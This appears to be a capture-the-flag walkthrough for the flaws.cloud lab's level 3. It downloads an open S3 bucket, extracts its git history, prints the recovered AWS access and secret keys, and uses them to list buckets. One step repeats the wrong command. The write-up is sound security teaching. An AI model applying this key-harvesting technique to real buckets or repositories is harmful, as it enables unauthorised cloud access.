Downloading the entire contents of the S3 bucket. 
```
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./level3 
```

![00e1a733ee04fca67fd44c8673417744.png](../../_resources/00e1a733ee04fca67fd44c8673417744-1.png)

Using GitTools `github.com/internetwache/GitTools` Extractor to extract any interesting commits and files from the `.git` directory.
```
/opt/GitTools/Extractor/extractor.sh level3 level3-extracted/
```

![724fb82f05022b74d68ac8efc29872f7.png](../../_resources/724fb82f05022b74d68ac8efc29872f7-1.png)

Listing interesting files: 
```
ls level3-extracted/0-f52ec03b227ea6094b04e43f475fb0126edb5a61 
```

![cf6570e1dfd1eed1fc5940d1238fdb3f.png](../../_resources/cf6570e1dfd1eed1fc5940d1238fdb3f-1.png)

Exfiltrating the secret keys: 
```
ls level3-extracted/0-f52ec03b227ea6094b04e43f475fb0126edb5a61 
```

Secret keys: 
```
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

![d073e9f047dfcaa292767df93948e760.png](../../_resources/d073e9f047dfcaa292767df93948e760-1.png)

Reconfiguring AWS CLI to change access credentials (you can also use profiles): 
```
aws configure
```

![504c05ab0e607f43d497d682b8e01355.png](../../_resources/504c05ab0e607f43d497d682b8e01355-1.png)

Using the S3 API to list all buckets that the user can access: 
```
aws s3api list-buckets --query "Buckets[].Name"
```

![f582b79a0ec5e95470921b253bab627a.png](../../_resources/f582b79a0ec5e95470921b253bab627a-1.png)

Success! We found the Level 4 bucket location at `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`

Lesson: People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always REVOKE any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often. 